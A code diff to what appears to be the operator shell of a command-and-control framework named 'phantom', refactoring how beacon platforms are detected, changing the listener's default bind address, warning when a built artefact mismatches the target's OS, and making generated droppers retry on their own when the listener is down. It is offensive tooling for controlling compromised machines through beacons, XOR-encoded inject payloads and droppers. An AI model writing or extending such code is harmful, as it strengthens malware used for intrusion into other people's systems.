@@ -261,7 +261,10 @@ class C2Shell(cmd.Cmd):
         if action == "start":
             try:
                 port = int(parts[1]) if len(parts) > 1 else (session.lport or 8080)
-                host = parts[2] if len(parts) > 2 else (session.lhost or "0.0.0.0")
+                # default bind comes from c2.bind (0.0.0.0): the DIAL
+                # address for beacons is a different setting (c2.host).
+                from phantom.core.c2_server import listener_bind_host
+                host = parts[2] if len(parts) > 2 else listener_bind_host()
                 use_ssl = parts[3].lower() in ("true", "1", "yes", "https") if len(parts) > 3 else True
                 server_instance.start(host=host, port=port, use_ssl=use_ssl)
                 proto = "HTTPS" if use_ssl else "HTTP"
@@ -1075,14 +1078,14 @@ class C2Shell(cmd.Cmd):
         return False
 
     def _beacon_platform(self) -> str:
-        """Detect active beacon platform from its ID prefix."""
-        if not self.active_beacon:
-            return ""
-        bid = self.active_beacon.upper()
-        if bid.startswith("WIN"): return "windows"
-        if bid.startswith("LNX"): return "linux"
-        if bid.startswith("AND"): return "android"
-        return ""
+        """Platform of the active beacon, from its id prefix.
+
+        The prefix map lives in `utils.target_platform` (ONE source): this
+        used to be a fifth private copy that also silently dropped every
+        platform it did not hardcode.
+        """
+        from phantom.utils.target_platform import from_beacon_id
+        return from_beacon_id(self.active_beacon or "").platform
 
     def _inject_payload_path(self, platform: str) -> str:
         """Return path to platform-specific XOR'd inject payload."""
@@ -1256,15 +1259,17 @@ class C2Shell(cmd.Cmd):
         arch = parts[1].lower() if len(parts) > 1 else ""
 
         if not platform:
-            # Check scan results for OS clues
+            # OS clue from the scan, classified by the ONE source
+            # (utils.target_platform) instead of a local substring test
+            from phantom.utils.target_platform import from_os_string
             scan_res = session.get_result("scan") or {}
-            all_text = str(scan_res).lower()
-            if "linux" in all_text or "unix" in all_text:
-                platform = "linux"
-                notifier.info("Detected Linux target from scan results. Defaulting to 'linux'.")
-            elif "windows" in all_text:
-                platform = "windows"
-                notifier.info("Detected Windows target from scan results. Defaulting to 'windows'.")
+            answer = from_os_string(str(scan_res), source="scan results")
+            if answer.platform in ("windows", "linux"):
+                platform = answer.platform
+                notifier.info(f"Detected {platform} target from scan "
+                              f"results. Defaulting to '{platform}'.")
+            elif answer.os_name:
+                platform = ""      # a scan that says nothing usable
             else:
                 import sys
                 valid_platforms_local = ["windows", "linux", "macos", "android"]
@@ -1288,7 +1293,26 @@ class C2Shell(cmd.Cmd):
         if platform not in valid_platforms:
             notifier.error(f"Invalid platform. Choose from: {', '.join(valid_platforms)}")
             return
-            
+
+        # The artefact family is not a style choice: PE ≠ ELF ≠ Mach-O, so
+        # an explicit platform that contradicts the target we detected is
+        # worth saying out loud BEFORE the build (the operator may be
+        # staging for a different box — or may have typed the wrong one).
+        try:
+            from phantom.core.knowledge import session_wm
+            from phantom.utils.target_platform import (
+                from_findings, is_kernel_compatible)
+            detected = from_findings(session_wm(), source="target os finding")
+            if detected.known and not is_kernel_compatible(detected.platform,
+                                                          platform):
+                notifier.warn(
+                    f"Target rilevato come {detected.platform} "
+                    f"({detected.os_name}) ma stai costruendo un artefatto "
+                    f"{platform}: famiglie di kernel diverse (PE/ELF/Mach-O). "
+                    f"Se il target è quello, l'eseguibile non partirà.")
+        except Exception:
+            pass
+
         # Architecture selection
         if not arch:
             if platform in ["linux", "windows"]:
@@ -1327,7 +1351,10 @@ class C2Shell(cmd.Cmd):
         if not (server_instance.thread and server_instance.thread.is_alive()):
             notifier.warn(f"Listener not active. Run: listeners start {port}")
 
-        dropper = generate_dropper(platform, host, port, arch=arch, use_ssl=use_ssl)
+        # resilient: a manual C2 delivery must survive the listener being
+        # down at paste time — the stager retries on its own
+        dropper = generate_dropper(platform, host, port, arch=arch,
+                                   use_ssl=use_ssl, resilient=True)
         if not dropper:
             notifier.error(f"Failed to generate dropper for {platform}")
             return
